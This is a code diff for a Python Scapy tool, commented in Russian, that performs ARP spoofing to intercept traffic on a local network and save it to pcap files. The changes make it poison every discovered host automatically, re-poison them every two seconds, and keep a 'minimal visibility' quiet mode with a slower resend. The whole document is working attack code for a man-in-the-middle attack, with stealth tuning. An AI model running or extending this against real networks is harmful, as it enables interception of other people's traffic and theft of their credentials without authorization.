@@ -61,12 +61,14 @@ def arp_spoof(spoof_mac, victim_ip, victim_mac, target_ip, target_mac):
   op = 2: -- "psrc адрес is at hwsrc" ("ip is at mac"), при отправлении пакета pdst и hwdst не используются!
   пакет летит к target ip адресу (заранее разрешит его по arp-у сам (если не прописан заголовок Ethernet))
   """
-    arp_to_victim_packet = Ether(dst=victim_mac) / ARP(op=2, psrc=target_ip, hwsrc=spoof_mac, hwdst=victim_mac)
-    sendp(arp_to_victim_packet, verbose=0, count=2)
+    if target_ip != "0.0.0.0" and target_ip != "255.255.255.255":
+        arp_to_victim_packet = Ether(dst=victim_mac) / ARP(op=2, psrc=target_ip, hwsrc=spoof_mac, hwdst=victim_mac)
+        sendp(arp_to_victim_packet, verbose=0, count=2)
 
     if bidirectional:
-        arp_to_target_packet = Ether(dst=target_mac) / ARP(op=2, psrc=victim_ip, hwsrc=spoof_mac, hwdst=target_mac)
-        sendp(arp_to_target_packet, verbose=0, count=2)
+        if victim_ip != "0.0.0.0" and victim_ip != "255.255.255.255":
+            arp_to_target_packet = Ether(dst=target_mac) / ARP(op=2, psrc=victim_ip, hwsrc=spoof_mac, hwdst=target_mac)
+            sendp(arp_to_target_packet, verbose=0, count=2)
 
     if verbose_enabled:
         print(f"Был перехвачен кадр от {victim_ip} ({victim_mac}) -> к {target_ip} ({target_mac})")
@@ -89,6 +91,9 @@ class Sniffer:
         self.queue = queue
         self.pcap_name = pcap_name
         self.rotate_output_len = rotate_output_len
+        self.spoof_mac = get_if_hwaddr(self.interface)
+        self.known_ips = []
+        self.spoof_ip = get_if_addr(self.interface)
         
 
     def sniff_and_find_new_devices(self):
@@ -133,9 +138,16 @@ class Sniffer:
         # Функция для обработки пакетов
     def packet_handler(self, packet):
         #nonlocal queue
-        spoof_ip = get_if_addr(self.interface)
+        
 
         if packet.haslayer(DHCP):
+            victim_ip = packet[IP].src if packet.haslayer(IP) else packet[ARP].psrc
+            target_ip = packet[IP].dst if packet.haslayer(IP) else packet[ARP].pdst
+
+            if target_ip not in self.known_ips:
+                self.known_ips.append(target_ip)
+            if victim_ip not in self.known_ips:
+                self.known_ips.append(victim_ip)
             pass # to avoid eternal reconnecting
         elif packet.haslayer(ARP):
             # Извлекаем IP и MAC адреса
@@ -151,6 +163,32 @@ class Sniffer:
                     # Добавляем устройство в очередь
                     self.queue.put((victim_ip, victim_mac))
                     self.queue.put((target_ip, target_mac))
+
+                    if target_ip != self.spoof_ip and victim_ip != self.spoof_ip and target_mac != self.spoof_mac and victim_mac != self.spoof_mac:
+                        arp_spoof(self.spoof_mac, victim_ip, victim_mac, target_ip, target_mac)
+
+                    if target_ip not in self.known_ips:
+                        self.known_ips.append(target_ip)
+                    if victim_ip not in self.known_ips:
+                        self.known_ips.append(victim_ip)
+
+            elif packet[ARP].op == 1 and packet[ARP].pdst in self.known_ips:
+                victim_ip = packet[ARP].psrc
+                victim_mac = packet[ARP].hwsrc
+
+                target_ip =  packet[ARP].pdst
+                target_mac = packet[ARP].hwdst
+
+                # Проверяем, является ли устройство новым
+                if target_ip not in self.queue.queue: 
+                    # Добавляем устройство в очередь
+                    self.queue.put((victim_ip, victim_mac))
+                    self.queue.put((target_ip, target_mac))
+
+                    if target_ip != self.spoof_ip and victim_ip != self.spoof_ip and target_mac != self.spoof_mac and victim_mac != self.spoof_mac:
+                        arp_spoof(self.spoof_mac, victim_ip, victim_mac, target_ip, target_mac)
+            
+
         elif packet.haslayer(IP):
             victim_ip = packet[IP].src if packet.haslayer(IP) else packet[ARP].psrc
             victim_mac = packet[ARP].hwsrc if packet.haslayer(ARP) else packet[Ether].src
@@ -158,16 +196,22 @@ class Sniffer:
             target_ip = packet[IP].dst if packet.haslayer(IP) else packet[ARP].pdst
             target_mac = packet[ARP].hwdst if packet.haslayer(ARP) else packet[Ether].dst
 
-            if str(target_ip).rpartition(".")[0] == str(spoof_ip).rpartition(".")[0] and str(target_ip) != str(spoof_ip):
-                if target_mac != "ff:ff:ff:ff:ff:ff" and target_mac != "00:00:00:00:00:00" and target_ip != "255.255.255.255":
+            if str(target_ip).rpartition(".")[0] == str(self.spoof_ip).rpartition(".")[0] and str(target_ip) != str(self.spoof_ip):
+                if target_mac != "ff:ff:ff:ff:ff:ff" and target_mac != "00:00:00:00:00:00" and target_ip != "255.255.255.255" and target_ip != "0.0.0.0":
                     if target_ip not in self.queue.queue:
                         self.queue.put((target_ip, target_mac))
                         self.queue.put((target_ip, target_mac))
-            if str(victim_ip).rpartition(".")[0] == str(spoof_ip).rpartition(".")[0] and str(victim_ip) != str(spoof_ip):
-                if victim_mac != "ff:ff:ff:ff:ff:ff" and victim_mac != "00:00:00:00:00:00" and victim_ip != "255.255.255.255":
+                        if target_ip not in self.known_ips:
+                            self.known_ips.append(target_ip)
+
+            if str(victim_ip).rpartition(".")[0] == str(self.spoof_ip).rpartition(".")[0] and str(victim_ip) != str(self.spoof_ip):
+                if victim_mac != "ff:ff:ff:ff:ff:ff" and victim_mac != "00:00:00:00:00:00" and victim_ip != "255.255.255.255" and victim_ip != "0.0.0.0":
                     if victim_ip not in self.queue.queue:
                         self.queue.put((victim_ip, victim_mac))
                         self.queue.put((victim_ip, victim_mac))
+
+                        if victim_ip not in self.known_ips:
+                            self.known_ips.append(victim_ip)
         
 
         # Записываем пакет в pcap файл
@@ -197,7 +241,6 @@ class Sniffer:
                             log.basicConfig(level=logging.INFO, filename=self.log_filename, filemode="w",
                                     format="%(asctime)s %(levelname)s %(message)s")
                             log.info(f"LOG file rotated, new one is {self.log_filename}")
-                        
                         
                         self.last_check_time = time.time()
                     except FileNotFoundError:
@@ -321,15 +364,13 @@ def main():
     parser.add_argument("-w", type=str, help="Файл для записи перехваченных пакетов", default="")
     parser.add_argument("-v", "--verbose", type=str, help="Включение расширенного вывода (True/False)", default="False")
     parser.add_argument("-q", "--quiet_mode", type=str,
-                        help="Включение режима минимальной заметности в сети, а соответственно и режима однонаправленности (True/False)",
+                        help="Включение режима минимальной заметности в сети (True/False)",
                         default="False")
     parser.add_argument("--rotate_output_len", type=int,
-                        help="Включение режима ротации выходных файлов и определение максимального размера файла (количество байт)",
+                        help="Включение режима ротации выходных файлов и определение максимального размера файла (количество Мега байт)",
                         default="0")
 
     args = parser.parse_args()
-
-    renew_arp_spoof_time = 20 # количество секунд до переотправки в эфир подделки собой всех найденных локальных ip (по желанию может быть вынесено в атрибуты командной строки)
 
     # Получаем параметры из командной строки
     interface = args.interface
@@ -343,13 +384,16 @@ def main():
     global verbose_enabled
     verbose_enabled = True if str(args.verbose).lower() == 'true' else False
     quiet_mode = True if str(args.quiet_mode).lower() == 'true' else False
-    if quiet_mode:
-        global bidirectional
-        bidirectional = False
     global rotate_output_len
-    rotate_output_len = int(args.rotate_output_len)
+    rotate_output_len = int(args.rotate_output_len) * 1024 * 1024 # В Мбайтах
 
     log.info(f"Got arguments: interface={interface}, spoof_ip={spoof_ip}, spoof_mac={spoof_mac}, gateway_ip={gateway_ip}, gateway_mac={gateway_mac},pcap_name={pcap_name}, verbose_enabled={verbose_enabled}, quiet_mode={quiet_mode}, rotate_output_len={rotate_output_len}")
+    
+    if quiet_mode:
+        renew_arp_spoof_time = 30 # количество секунд до переотправки в эфир подделки собой всех найденных локальных ip (по желанию может быть вынесено в атрибуты командной строки)
+    else:
+        renew_arp_spoof_time = 2
+    
     # Создаем очередь для передачи данных
     queue = Queue()
 
@@ -371,15 +415,15 @@ def main():
     old_list = []
     global_resend_time = 0
 
-    if not quiet_mode:
-        if gateway_ip != "":
-            old_list += network_arp_discovery(interface, gateway_ip, gateway_mac)
-            if gateway_ip not in old_list:
-                old_list.append(gateway_ip)
-            last_spoof_time[gateway_ip] = time.time()
-        else:
-            old_list += network_arp_discovery(interface)
-        log.info(f"Studying local network gave us devices: {old_list}")
+
+    if gateway_ip != "":
+        old_list += network_arp_discovery(interface, gateway_ip, gateway_mac)
+        if gateway_ip not in old_list:
+            old_list.append(gateway_ip)
+        last_spoof_time[gateway_ip] = time.time()
+    else:
+        old_list += network_arp_discovery(interface)
+    log.info(f"Studying local network gave us devices: {old_list}")
 
     while True:
         try:
@@ -408,7 +452,7 @@ def main():
                         # Отправляем ARP-подделку, если прошло более 15 секунд
                         arp_spoof(spoof_mac, victim_ip, victim_mac, target_ip, target_mac)
                         last_spoof_time[target_ip] = time.time()
-            if not quiet_mode and time.time() - global_resend_time >= renew_arp_spoof_time:
+            if time.time() - global_resend_time >= renew_arp_spoof_time:
                 # Переотправка в эфир подделки собой всех найденных локальных ip
                 log.info(f"Gone 2 minutes, resending arp spoof to all known {old_list}")
                 for i in range(len(old_list)):
@@ -418,7 +462,7 @@ def main():
                     global_resend_time = time.time()
         except Empty:
             # Ожидаем новые данные
-            if not quiet_mode and time.time() - global_resend_time >= renew_arp_spoof_time:
+            if time.time() - global_resend_time >= renew_arp_spoof_time:
                 # Переотправка в эфир подделки собой всех найденных локальных ip
                 log.info(f"Gone 2 minutes, resending arp spoof to all known {old_list}")
                 for i in range(len(old_list)):
